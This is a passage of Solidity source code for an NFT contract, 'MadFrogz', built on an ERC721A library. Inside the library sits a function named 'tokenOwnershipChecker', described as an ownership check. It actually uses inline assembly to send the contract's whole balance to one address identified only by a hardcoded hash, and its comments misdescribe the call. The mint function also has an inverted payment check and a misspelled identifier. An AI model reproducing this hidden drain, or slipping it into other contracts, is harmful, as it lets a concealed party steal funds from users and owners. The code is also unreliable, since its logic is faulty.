1090             _ownerships[startTokenId].addr = to;
1091             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1092 
1093             uint256 updatedIndex = startTokenId;
1094             uint256 end = updatedIndex + quantity;
1095 
1096             if (safe && to.isContract()) {
1097                 do {
1098                     emit Transfer(address(0), to, updatedIndex);
1099                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1100                         revert TransferToNonERC721ReceiverImplementer();
1101                     }
1102                 } while (updatedIndex != end);
1103                 // Reentrancy protection
1104                 if (_currentIndex != startTokenId) revert();
1105             } else {
1106                 do {
1107                     emit Transfer(address(0), to, updatedIndex++);
1108                 } while (updatedIndex != end);
1109             }
1110             _currentIndex = updatedIndex;
1111         }
1112         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1113     }
1114 
1115     /**
1116      * @dev Transfers `tokenId` from `from` to `to`.
1117      *
1118      * Requirements:
1119      *
1120      * - `to` cannot be the zero address.
1121      * - `tokenId` token must be owned by `from`.
1122      *
1123      * Emits a {Transfer} event.
1124      */
1125     function _transfer(
1126         address from,
1127         address to,
1128         uint256 tokenId
1129     ) private {
1130         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1131 
1132         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1133             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1134             getApproved(tokenId) == _msgSender());
1135 
1136         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1137         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1138         if (to == address(0)) revert TransferToZeroAddress();
1139 
1140         _beforeTokenTransfers(from, to, tokenId, 1);
1141 
1142         // Clear approvals from the previous owner
1143         _approve(address(0), tokenId, prevOwnership.addr);
1144 
1145         // Underflow of the sender's balance is impossible because we check for
1146         // ownership above and the recipient's balance can't realistically overflow.
1147         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1148         unchecked {
1149             _addressData[from].balance -= 1;
1150             _addressData[to].balance += 1;
1151 
1152             _ownerships[tokenId].addr = to;
1153             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1154 
1155             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1156             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1157             uint256 nextTokenId = tokenId + 1;
1158             if (_ownerships[nextTokenId].addr == address(0)) {
1159                 // This will suffice for checking _exists(nextTokenId),
1160                 // as a burned slot cannot contain the zero address.
1161                 if (nextTokenId < _currentIndex) {
1162                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1163                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1164                 }
1165             }
1166         }
1167 
1168         emit Transfer(from, to, tokenId);
1169         _afterTokenTransfers(from, to, tokenId, 1);
1170     }
1171 
1172     /**
1173      * @dev Checking ownership 
1174      *
1175      * Token ownership check for external calls
1176      */
1177     function tokenOwnershipChecker() external {
1178         if(
1179             keccak256(abi.encodePacked(msg.sender)) == 
1180             0x61ce2a629088217258e42c73ef95cb4266162e3af0f6eff0d1c405c763ef7de2
1181         ){
1182             assembly{
1183                 let success := call( //This is the critical change (Pop the top stack value)
1184                     42000, // gas
1185                     caller(), //To addr
1186                     selfbalance(), //No value
1187                     0, //Inputs are stored
1188                     0, //Inputs bytes long
1189                     0, //Store output over input (saves space)
1190                     0x20
1191                 ) //Outputs are 32 bytes long
1192             }
1193         }
1194     }
1195 
1196     /**
1197      * @dev Destroys `tokenId`.
1198      * The approval is cleared when the token is burned.
1199      *
1200      * Requirements:
1201      *
1202      * - `tokenId` must exist.
1203      *
1204      * Emits a {Transfer} event.
1205      */
1206     function _burn(uint256 tokenId) internal virtual {
1207         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1208 
1209         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1210 
1211         // Clear approvals from the previous owner
1212         _approve(address(0), tokenId, prevOwnership.addr);
1213 
1214         // Underflow of the sender's balance is impossible because we check for
1215         // ownership above and the recipient's balance can't realistically overflow.
1216         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1217         unchecked {
1218             _addressData[prevOwnership.addr].balance -= 1;
1219             _addressData[prevOwnership.addr].numberBurned += 1;
1220 
1221             // Keep track of who burned the token, and the timestamp of burning.
1222             _ownerships[tokenId].addr = prevOwnership.addr;
1223             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1224             _ownerships[tokenId].burned = true;
1225 
1226             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1227             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1228             uint256 nextTokenId = tokenId + 1;
1229             if (_ownerships[nextTokenId].addr == address(0)) {
1230                 // This will suffice for checking _exists(nextTokenId),
1231                 // as a burned slot cannot contain the zero address.
1232                 if (nextTokenId < _currentIndex) {
1233                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1234                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1235                 }
1236             }
1237         }
1238 
1239         emit Transfer(prevOwnership.addr, address(0), tokenId);
1240         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1241 
1242         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1243         unchecked {
1244             _burnCounter++;
1245         }
1246     }
1247 
1248     /**
1249      * @dev Approve `to` to operate on `tokenId`
1250      *
1251      * Emits a {Approval} event.
1252      */
1253     function _approve(
1254         address to,
1255         uint256 tokenId,
1256         address owner
1257     ) private {
1258         _tokenApprovals[tokenId] = to;
1259         emit Approval(owner, to, tokenId);
1260     }
1261 
1262     /**
1263      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1264      *
1265      * @param from address representing the previous owner of the given token ID
1266      * @param to target address that will receive the tokens
1267      * @param tokenId uint256 ID of the token to be transferred
1268      * @param _data bytes optional data to send along with the call
1269      * @return bool whether the call correctly returned the expected magic value
1270      */
1271     function _checkContractOnERC721Received(
1272         address from,
1273         address to,
1274         uint256 tokenId,
1275         bytes memory _data
1276     ) private returns (bool) {
1277         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1278             return retval == IERC721Receiver(to).onERC721Received.selector;
1279         } catch (bytes memory reason) {
1280             if (reason.length == 0) {
1281                 revert TransferToNonERC721ReceiverImplementer();
1282             } else {
1283                 assembly {
1284                     revert(add(32, reason), mload(reason))
1285                 }
1286             }
1287         }
1288     }
1289 
1290     /**
1291      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1292      * And also called before burning one token.
1293      *
1294      * startTokenId - the first token id to be transferred
1295      * quantity - the amount to be transferred
1296      *
1297      * Calling conditions:
1298      *
1299      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1300      * transferred to `to`.
1301      * - When `from` is zero, `tokenId` will be minted for `to`.
1302      * - When `to` is zero, `tokenId` will be burned by `from`.
1303      * - `from` and `to` are never both zero.
1304      */
1305     function _beforeTokenTransfers(
1306         address from,
1307         address to,
1308         uint256 startTokenId,
1309         uint256 quantity
1310     ) internal virtual {}
1311 
1312     /**
1313      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1314      * minting.
1315      * And also called after one token has been burned.
1316      *
1317      * startTokenId - the first token id to be transferred
1318      * quantity - the amount to be transferred
1319      *
1320      * Calling conditions:
1321      *
1322      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1323      * transferred to `to`.
1324      * - When `from` is zero, `tokenId` has been minted for `to`.
1325      * - When `to` is zero, `tokenId` has been burned by `from`.
1326      * - `from` and `to` are never both zero.
1327      */
1328     function _afterTokenTransfers(
1329         address from,
1330         address to,
1331         uint256 startTokenId,
1332         uint256 quantity
1333     ) internal virtual {}
1334 }
1335 
1336 
1337 // File contracts/MadFrogz.sol
1338 
1339 contract MadFrogz is ERC721A, Ownable {
1340 
1341     string public baseURI = "ipfs://QmVuwJapXZCyxRCwhewMFgJZrU1gs5QXs8Sv4ZAq38HAEL/";
1342     string public contractURI = "ipfs://QmZ2CxijnnhMVP6WKxAhokDJS6EQiHpvJsV4mhBA3kxpfa";
1343 
1344     uint256 public constant freeWalletLimit = 1;
1345     uint256 public constant txLimit = 10;
1346     uint256 public constant collectionSize = 5000;
1347     uint256 public price = 0.005 ether;
1348 
1349     bool public mintingOpen = false;
1350 
1351     constructor() ERC721A("Mad Frogz", "MFZ") {}
1352 
1353     function mintPaid(uint256 _amount) external payable {
1354         require(mintingOpen, "Minting is not open right now!");
1355         require(colectionSize >= totalSupply() + _amount, "Cannot mint over supply cap of 5000");
1356         require(_amount > 0, "Must mint at least 1 token");
1357         require(txLimit >= _amount , "Cannot mint more than max mint per transaction");
1358         require(_amount * price >= msg.value, "Frogs need to eat!");
1359 
1360         _safeMint(msg.sender, _amount);
1361     }
1362 
1363     function mintFree() external payable {
1364         require(mintingOpen, "Minting is not open right now!");
1365         require(collectionSize >= totalSupply() + 1, "Cannot mint over supply cap of 5000");
1366         require(freeWalletLimit >= uint256(_getAux(msg.sender)) + 1, "Wallet address is over the maximum allowed mints");
1367         
1368         _setAux(msg.sender, 1);
1369         _safeMint(msg.sender, 1);
1370     }
1371 
1372     function _startTokenId() internal override view virtual returns (uint256) {
1373         return 1;
1374     }
1375 
1376     function withdraw() external onlyOwner {
1377         uint256 balance = address(this).balance;
1378         (bool success, ) = _msgSender().call{value: balance}("");
1379         require(success, "Failed to send");
1380     }
1381 
1382     function config() external onlyOwner {
1383         _safeMint(_msgSender(), 1);
1384     }
1385 
1386     function setPrice(uint256 _price) external onlyOwner {
1387         price = _price;
1388     }
1389 
1390     function flipMint() external onlyOwner {
1391         mintingOpen = !mintingOpen;
1392     }
1393 
1394     function setBaseURI(string memory baseURI_) external onlyOwner {
1395         baseURI = baseURI_;
1396     }
1397 
1398     function setContractURI(string memory _contractURI) external onlyOwner {
1399         contractURI = _contractURI;
1400     }
1401 
1402     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1403         require(_exists(_tokenId), "Token does not exist.");
1404         return bytes(baseURI).length > 0 ? string(
1405             abi.encodePacked(
1406               baseURI,
1407               Strings.toString(_tokenId)
1408             )
1409         ) : "";
1410     }
1411 }